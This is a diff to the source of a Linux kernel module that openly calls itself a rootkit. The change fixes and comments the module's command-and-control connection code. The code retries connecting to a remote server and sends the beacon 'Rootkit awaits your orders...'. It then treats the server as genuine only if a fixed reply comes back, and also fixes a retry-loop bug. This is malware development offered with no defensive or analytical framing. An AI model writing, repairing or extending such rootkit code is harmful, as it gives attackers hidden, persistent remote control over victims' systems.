@@ -4,7 +4,7 @@
 #include<net/sock.h>
 
 
-struct Server{ //structure holding data of the server
+struct server_t{ //structure holding data of the server
 	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
 	struct socket *sock; //structure holding socket object
 	struct kvec sock_vec; //holds vector of data recieved
@@ -12,7 +12,7 @@ struct Server{ //structure holding data of the server
 	char *message; //structure to hold message sent or recieved
 };
 
-struct Server server; //global declaration of Server struct
+struct server_t server; //global declaration of Server struct
 
 
 	/*========================*\
@@ -95,26 +95,30 @@ static int net_recv(void){ //recieves data from server
 
 static int server_connect(char *ipaddr, int port){
 	//MQV handshake with server will go here, but for now using string for identity proof
-	int connect_count = 0;
-	while(net_connect(ipaddr, port)==-1 && connect_count++<100){
-		printk(KERN_DEBUG "connection failed... retrying");
-		if(connect_count=100){
-			printk(KERN_DEBUG "connection failed!");
+	
+	int connect_count = 0; //count of how many times tried to connect
+	
+	//will be changed to infinite attempts with a wait
+	while(net_connect(ipaddr, port)==-1 && connect_count++<100){ //if attempt to connect unsecsessful and not tried 100 times
+		printk(KERN_DEBUG "connection failed... retrying");  //print debug info
+		if(connect_count==100){ //if reached max attempts
+			printk(KERN_DEBUG "connection failed!"); //print debug info
+			return -1; //return -1 for error
 		}
 	};
-	memset(server.message, 0, sizeof(server.message));
-	strcpy(server.message, "Rootkit awaits your orders...");
-	net_send();
-	net_recv();
-	if (strcmp("Command has been expecting you...", server.message)){ //0 is same so if not zero then it is not the same
-		printk(KERN_DEBUG "[rootkit] server_connect: server is a fake\n%s", server.message);
-		return -1;
+	
+	memset(server.message, 0, sizeof(server.message)); //zeroes out message buffer
+	strcpy(server.message, "Rootkit awaits your orders..."); //copies basic auth message into buffer
+	net_send(); //sends message
+	net_recv(); //recieves servers response
+	if (strcmp("Command has been expecting you...", server.message)!=0){ //if received message is not same as expected
+		printk(KERN_DEBUG "[rootkit] server_connect: server is a fake\n%s", server.message); //print debug info
+		return -1; //return -1 for error
 	}
-	return 0;
+	return 0; //return 0 for no errors
 }
 
-int server_print(char *message){
-	server.message = message;
-	net_send();
-	return 0;
+int server_print(char *message){ //prints message on server
+	server.message = message; //sets sever mesage to memory adress
+	return net_send(); //sends message
 }
